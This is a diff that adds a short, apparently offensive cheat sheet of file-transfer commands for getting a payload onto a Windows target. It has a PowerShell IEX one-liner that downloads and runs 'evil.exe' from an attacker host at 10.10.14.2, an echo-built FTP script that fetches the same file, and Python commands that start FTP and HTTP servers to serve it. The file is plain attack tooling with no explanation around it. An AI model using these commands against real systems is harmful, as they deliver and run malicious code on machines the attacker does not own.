@@ -1,0 +1,18 @@
+# Powershell to pull from HTTP 
+C:\>  IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.2/evil.exe') > evil.exe
+
+# Windows FTP via CMD - 
+echo open 10.10.14.2 > ftp.txt
+echo anon >> ftp.txt
+echo candyland >> ftp.txt
+echo bin >> ftp.txt
+echo GET evil.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
+
+# Launch Python FTP
+sudo pip install pyftpdlib
+python -m pyftpdlib -p21
+
+# Launch Python HTTP
+python -m SimpleHTTPServer 80
